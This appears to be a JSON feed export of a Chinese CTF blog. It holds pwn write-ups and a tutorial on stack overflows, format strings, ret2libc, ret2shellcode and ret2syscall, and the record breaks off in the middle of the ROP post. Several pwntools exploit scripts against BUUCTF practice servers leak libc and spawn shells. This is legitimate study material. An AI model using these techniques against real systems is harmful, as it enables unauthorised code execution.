{
    "version": "https://jsonfeed.org/version/1",
    "title": "木提青",
    "subtitle": "blog",
    "icon": "http://jexy-kynner.github.io/images/favicon.ico",
    "description": "木提青本青",
    "home_page_url": "http://Jexy-Kynner.github.io",
    "items": [
        {
            "id": "http://jexy-kynner.github.io/2024/06/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "url": "http://jexy-kynner.github.io/2024/06/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "title": "格式化字符串",
            "date_published": "2024-06-16T12:54:47.000Z",
            "content_html": "<p>诶啊啊啊为什么博客加载这么缓慢啊<br />\n闭个麦....<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNodW5xaXUvcC85MzI5Mzg3Lmh0bWw=\"></span><br />\n[参考博客]: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeV9fX3lzeS9hcnRpY2xlL2RldGFpbHMvMTM1NzAwMTQw\">https://blog.csdn.net/ysy___ysy/article/details/135700140</span><br />\n [参考博客]: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI0MDJfODM0MjIzNTcvYXJ0aWNsZS9kZXRhaWxzLzEzOTE4MDQwNA==\">https://blog.csdn.net/2402_83422357/article/details/139180404</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzk0NjEyL2FydGljbGUvZGV0YWlscy84NDkwMDY2OA==\"> 戳此切大佬博客</span></p>\n<p>如输出第五个参数可以写为 %4<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mtext>，第六个为</mtext></mrow><annotation encoding=\"application/x-tex\">s，第六个为%5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">六</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">为</span></span></span></span>s，需要输出第 n 个参数就是 %(n-1)[格式化控制符]。因此我们的payload可以简化为”\\x01\\x80\\x04\\x08%5s”</p>\n<p>有一个还挺方便的函数 payload = fmtstr_payload (偏移，{原地址：目的地址})<br />\npayload = fmtstr_payload(11,{0x0804A048:0xC0})</p>\n",
            "tags": [
                "Pwn",
                "stack",
                "刷题"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/06/12/ret2libc%E9%A2%98/",
            "url": "http://jexy-kynner.github.io/2024/06/12/ret2libc%E9%A2%98/",
            "title": "ciscn_2019_c_1",
            "date_published": "2024-06-11T16:35:15.000Z",
            "content_html": "<h1 id=\"ciscn_2019_c_1\"><a class=\"anchor\" href=\"#ciscn_2019_c_1\">#</a> ciscn_2019_c_1</h1>\n<p>先查看保护机制，64 位开了 NX 保护</p>\n<p><img data-src=\"https://s2.loli.net/2024/06/16/qxF3M8P5YBlgESc.png\" alt=\"\" /></p>\n<p>发现应该是用不了 ret2syscall 的</p>\n<p><img data-src=\"https://s2.loli.net/2024/06/16/h4WOiSzXoHmF7bx.png\" alt=\"\" /></p>\n<p>v4 是格式化输入的，不存在溢出 55<br />\n<span class=\"kbd red\">v4!=2 退出里面的小循环，=1 进入 encrypt () 函数</span></p>\n<p><img data-src=\"https://s2.loli.net/2024/06/16/wvKtda37fyZmXjo.png\" alt=\"\" /></p>\n<p>看到 s 和 gets (), 填充为 0x50+8<br />\n 发现 puts ()-&gt;re2libc<br />\n 然后程序有一个死循环</p>\n<div class=\"note warning\">\n<pre><code>if ( v0 &gt;= strlen(s) )\n  break;\n</code></pre>\n</div>\n<p>让 s 第一个字符是‘\\0’退出循环<br />\n offset=0x50+8-1</p>\n<p>exp</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"><span>a</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>from <span class=\"token class-name\">LibcSearcher</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">28091</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>#p<span class=\"token operator\">=</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span>'<span class=\"token punctuation\">.</span>/ciscn_2019_c_1'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./ciscn_2019_c_1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main_addr<span class=\"token operator\">=</span><span class=\"token number\">0x400B28</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x4006b9</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_rdi<span class=\"token operator\">=</span><span class=\"token number\">0x400c83</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>'<span class=\"token class-name\">Input</span> your choice<span class=\"token operator\">!</span>\\n<span class=\"token char\">','</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span>b<span class=\"token char\">'\\0'</span><span class=\"token operator\">+</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>'encrypted\\n'<span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span>'<span class=\"token class-name\">Ciphertext</span>\\n'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>puts_real<span class=\"token operator\">=</span><span class=\"token function\">u64</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span><span class=\"token char\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token operator\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>b<span class=\"token char\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span>puts_real<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>libc<span class=\"token operator\">=</span><span class=\"token class-name\">LibcSearcher</span><span class=\"token punctuation\">(</span><span class=\"token char\">'puts'</span><span class=\"token punctuation\">,</span>puts_real<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>libc_addr<span class=\"token operator\">=</span>puts_real<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>bin_sh_addr<span class=\"token operator\">=</span>libc_addr<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span>   </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>system_real_addr<span class=\"token operator\">=</span>libc_addr<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span><span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>'<span class=\"token class-name\">Input</span> your choice<span class=\"token operator\">!</span>\\n<span class=\"token char\">','</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>payload2<span class=\"token operator\">=</span>b<span class=\"token char\">'\\0'</span><span class=\"token operator\">+</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>bin_sh_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>system_real_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>'encrypted\\n'<span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/06/16/cu4IdzKfhsnHJFS.png\" alt=\"\" /></p>\n<p>好趴，调用 libcsearch 库和那个网站最后都一样啊，还是有那么多版本还是要都试一遍</p>\n<p><img data-src=\"https://s2.loli.net/2024/06/16/lCctMBg6KFkOTUi.png\" alt=\"\" /></p>\n",
            "tags": [
                "Pwn",
                "stack"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/06/05/BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/",
            "url": "http://jexy-kynner.github.io/2024/06/05/BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/",
            "title": "BUU刷题（2）",
            "date_published": "2024-06-05T15:23:26.000Z",
            "content_html": "<h1 id=\"others_shellcode\"><a class=\"anchor\" href=\"#others_shellcode\">#</a> others_shellcode</h1>\n<p>用的是 ret2syscall<br />\n<img data-src=\"https://s2.loli.net/2024/06/06/QFdcD63uiTWepP4.jpg\" alt=\"\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">25448</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我很疑惑为什么没有 ebx ecx edx 寄存器对应参数，只有程序自带的 eax,/bin//sh,int80...</p>\n<p><img data-src=\"https://s2.loli.net/2024/06/06/93EfmYOu5tBTU8p.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/06/06/DJ5nWA8HFEjtrbp.jpg\" alt=\"\" /></p>\n<p>好啦，edx 是 0，ebx,ecx 参数已经读取 esp 被传上去了</p>\n",
            "tags": [
                "Pwn",
                "stack"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/06/01/BUU%E5%88%B7%E9%A2%98(1)/",
            "url": "http://jexy-kynner.github.io/2024/06/01/BUU%E5%88%B7%E9%A2%98(1)/",
            "title": "BUU刷题(1)",
            "date_published": "2024-05-31T16:50:47.000Z",
            "content_html": "<h1 id=\"ciscn_2019_n_1\"><a class=\"anchor\" href=\"#ciscn_2019_n_1\">#</a> ciscn_2019_n_1</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/aCDsHiRp5zBlm9k.png\" alt=\"\" /></p>\n<p>覆盖 v1-&gt;system 地址</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">25432</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4006BE</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"jarvisoj_level0\"><a class=\"anchor\" href=\"#jarvisoj_level0\">#</a> jarvisoj_level0</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/jg9iPpUSV85fdMC.jpg\" alt=\"\" /><br />\n<img data-src=\"https://s2.loli.net/2024/06/02/B4wyUVYizlQnLH8.jpg\" alt=\"\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">27244</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40059A</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "Pwn",
                "stack",
                "刷题"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/05/22/ROP/",
            "url": "http://jexy-kynner.github.io/2024/05/22/ROP/",
            "title": "ROP",
            "date_published": "2024-05-21T16:22:44.000Z",
            "content_html": "<h1 id=\"栈溢出原理\"><a class=\"anchor\" href=\"#栈溢出原理\">#</a> 栈溢出原理</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/HW7zjmqDtJYn5G3.png\" alt=\"\" /></p>\n<p>先把基本栈溢出原理说清楚，上图可能不太清晰。<br />\n自己的话讲就是函数 A 原本 rbp 和 rsp,call 调用函数 B 后，rbp 上去变成 rsp, 原本的 rsp 随着函数 B 各种参数，寄存器 balabala 继续往栈顶生长。调用 B 完再逆操作，回到函数 A,rbp 回到函数 A 的返回地址，rsp 回到函数 B 底部，leave 之后 ret 进入 A<br />\n<strong> 所以！！我们怎么利用呢</strong><br />\n距离 rbp 在调用完函数 B 回到函数 A 时，我们已经把函数 B 溢出点距离 rbp 的内容填满，加上目标地址，最后回到函数 A 过程中，rbp 就在目标地址那<br />\n<em>通俗：溢出点距离 rbp 多少空间 + 目标地址 + rbp (64-8//32-4)-&gt; 发送这个</em><br />\n嗯，应该是这样的，不对回来再改（U ´ᴥ` U）</p>\n<h2 id=\"查看偏移量\"><a class=\"anchor\" href=\"#查看偏移量\">#</a> 查看偏移量</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>直接在<span class=\"token constant\">IDA</span>里眼瞅</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">2.</span>用cyclic</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        pwndbg<span class=\"token operator\">></span> cyclic <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        pwndbg<span class=\"token operator\">></span> run</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        看到报错“<span class=\"token class-name\">Invalid</span> address <span class=\"token number\">0</span>x<span class=\"token punctuation\">[</span>xxxx<span class=\"token punctuation\">]</span>”</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        pwndbg<span class=\"token operator\">></span> cyclic <span class=\"token operator\">-</span>l <span class=\"token number\">0</span>x<span class=\"token punctuation\">[</span>xxxx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>或者haab<span class=\"token operator\">?</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">3.</span>gdb<span class=\"token operator\">-</span>peda</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        用法和cyclic差不多，</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        pattern create <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        c</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        pattern offset <span class=\"token punctuation\">[</span>xxxx<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h1 id=\"ret2text适用于可以看到system后门函数的时候用\"><a class=\"anchor\" href=\"#ret2text适用于可以看到system后门函数的时候用\">#</a> ret2text———— 适用于可以看到 system 后门函数的时候用</h1>\n<p>上题目！————Buu--warmup_csaw_2016</p>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/9PKad1Fcem2BoD7.jpg\" alt=\"alt text\" /></p>\n<p><strong>gets () 危险函数，v5 就是溢出点，距离 0x40</strong></p>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/fApI3skWJS5E69w.jpg\" alt=\"\" /></p>\n<p>应该选择压入参数 cat flag 的地址 0x400611</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">26256</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400611</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ret2shellcode\"><a class=\"anchor\" href=\"#ret2shellcode\">#</a> ret2shellcode</h1>\n<p><em>没有后门函数，没有直接的 system (/bin/sh) 的时候用！</em><br />\n<em>shellcode 所在的区域具有可执行权限！</em>———— 所以开启 NX 保护应该是用不了的<br />\n让它在脚本里生成一个 shellcode（指令为:shellcode = asm (<span class=\"exturl\" data-url=\"aHR0cDovL3NoZWxsY3JhZnQuc2g=\">shellcraft.sh</span>())）<br />\n这个是 pwntools 自带的，用这个相当于我们整了一个 /bin/sh 过去</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>基本脚本：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">context</span><span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token char\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token char\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token char\">'debug'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 废话（bushi）但是要写</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"balabala\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ip\"</span><span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    shellcode <span class=\"token operator\">=</span> <span class=\"token function\">asm</span><span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token function\">sh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    payload <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p32</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span>x<span class=\"token punctuation\">[</span>溢出地址<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 填充偏移量，如果 offset>shellcode, 继续填充垃圾字节</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ret2syscall\"><a class=\"anchor\" href=\"#ret2syscall\">#</a> ret2syscall</h1>\n<p><em>在 ret2shellcode 条件下开了 NX 保护的时候用</em></p>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h2>\n<p>利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程<br />\n gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。<br />\nx86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用</p>\n<blockquote>\n<p>mov eax,<br />\n0xb mov ebx,<br />\n[“/bin/sh”]<br />\nmov ecx,<br />\n0 mov edx,<br />\n0 int 0x80</p>\n</blockquote>\n<p>转自某一个博客：在 Linux 中，系统调用通常通过 int 80h 汇编代码实现，int 终端，80h 则是代指的系统调用的终端符号，当程序执行到 int 80h 时，就会将相应的通用寄存器 eax 中的参数作为系统调用的调用号，其他寄存器中的值或者地址所指向的值作为参数（execve (&quot;/bin/sh&quot;,NULL,NULL)  ） //（32 位程序）<br />\n所以我们的目标 -&gt; 调用 execve ()</p>\n<div class=\"note warning\">\n<p>!!! 如何调用 execve () 函数<br />\n系统调用号，即 eax 应该为 0xb<br />\n 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br />\n第二个参数，即 ecx 应该为 0<br />\n 第三个参数，即 edx 应该为 0</p>\n</div>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用gdb</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">1.</span>寻找控制 eax 的 gadgets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">ROPgadget</span> <span class=\"token operator\">--</span>binary 文件名  <span class=\"token operator\">--</span>only 'pop<span class=\"token operator\">|</span>ret' <span class=\"token operator\">|</span> grep <span class=\"token char\">'eax'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">2.</span>ebx，edx<span class=\"token punctuation\">,</span>ecx的ret</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">ROPgadget</span> <span class=\"token operator\">--</span>binary 文件名  <span class=\"token operator\">--</span>only 'pop<span class=\"token operator\">|</span>ret' <span class=\"token operator\">|</span> grep <span class=\"token char\">'ebx'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    #或者直接<span class=\"token class-name\">ROPgadget</span> <span class=\"token operator\">--</span>binary 文件名  <span class=\"token operator\">--</span>only 'pop<span class=\"token operator\">|</span>ret'查看所有的</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">3.</span>获得 <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh 字符串对应的地址。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token class-name\">ROPgadget</span> <span class=\"token operator\">--</span>binary 文件名  <span class=\"token operator\">--</span>string '<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh' </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">4.</span><span class=\"token keyword\">int</span> <span class=\"token number\">0x80</span> 的地址</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token class-name\">ROPgadget</span> <span class=\"token operator\">--</span>binary r文件名  <span class=\"token operator\">--</span>only <span class=\"token char\">'int'</span> </pre></td></tr><tr><td 